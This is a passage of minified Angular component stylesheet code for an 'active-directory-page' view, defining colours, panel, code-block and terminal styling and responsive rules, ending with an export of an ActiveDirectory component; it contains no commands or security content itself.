.mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 16px 16px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{position:relative;max-width:100%;box-sizing:border-box;background:#080d14;color:#38bdf8;padding:16px 18px 16px 24px;border-radius:8px;border:1px solid #1e293b;overflow-x:auto;overflow-y:hidden;margin:1rem 0 0;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;line-height:1.7;tab-size:2;white-space:pre;box-shadow:inset 0 0 20px #00000040}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:inherit;font-size:inherit;line-height:inherit}.active-directory-page[_ngcontent-%COMP%]     .terminal-comment{color:#aebdc2!important;opacity:1!important;font-style:normal;font-weight:500}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar{height:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-track{background:#0b1220;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb{background:#334155;border-radius:8px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]::-webkit-scrollbar-thumb:hover{background:#475569}@media(max-width:768px){.common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:24px}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{min-height:110px;padding:1rem}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{width:42px;height:42px}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-body[_ngcontent-%COMP%]{padding:0 12px 12px}.active-directory-page[_ngcontent-%COMP%]   pre[_ngcontent-%COMP%]{padding:14px;font-size:12px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{gap:.75rem!important;margin:2rem 0 1.25rem!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:.75rem!important}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%], .active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:none}}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin-bottom:1.5rem;color:#94a3b8;font-size:.9rem;line-height:1.7}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:.85rem;overflow:hidden;background:#0b1220!important;border:1px solid #1e293b;border-radius:10px!important;box-shadow:none!important}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:56px;padding:0 1.25rem;background:#111827;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#172235!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#7fffd4;font-size:.9rem;font-weight:600;letter-spacing:.01em}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   .mat-expansion-indicator[_ngcontent-%COMP%]:after{color:#67e8f9}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:1rem 1.25rem 1.25rem;background:#0b1220}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]{display:block;min-width:0;margin-top:.75rem}.active-directory-page[_ngcontent-%COMP%]   app-terminal[_ngcontent-%COMP%]:first-child{margin-top:0}@media(max-width:768px){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{min-height:52px;padding:0 .9rem}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{font-size:.8rem}.active-directory-page[_ngcontent-%COMP%]   .mat-expansion-panel-body[_ngcontent-%COMP%]{padding:.85rem}}@media(prefers-reduced-motion:reduce){.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{transition:none}}"]})};export{G as ActiveDirectory};
